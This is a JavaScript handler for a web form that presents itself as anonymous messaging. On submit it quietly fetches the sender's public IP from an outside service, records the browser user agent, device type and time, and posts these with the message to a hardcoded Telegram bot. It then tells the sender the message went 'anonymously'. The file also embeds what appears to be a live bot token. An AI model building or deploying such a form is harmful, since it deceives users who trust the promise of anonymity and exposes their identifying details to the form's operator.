document.getElementById("anonForm").addEventListener("submit", async function (e) {
  e.preventDefault();
  const message = document.getElementById("message").value;

  const res = await fetch("https://api.ipify.org?format=json");
  const data = await res.json();
  const ip = data.ip;

  const userAgent = navigator.userAgent;
  const device = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
  const time = new Date().toLocaleString();

  const telegramToken = "8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0";
  const chatId = "7244443820";

  const text = `🔥 *New Anonymous Message Received*\n\n📩 *Message:* ${message}\n🌐 *IP:* ${ip}\n📱 *Device:* ${device}\n🕐 *Time:* ${time}\n🧠 *Browser:* ${userAgent}`;

  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: "Markdown"
    })
  });

  alert("Message sent anonymously 😇");
  document.getElementById("message").value = "";
});
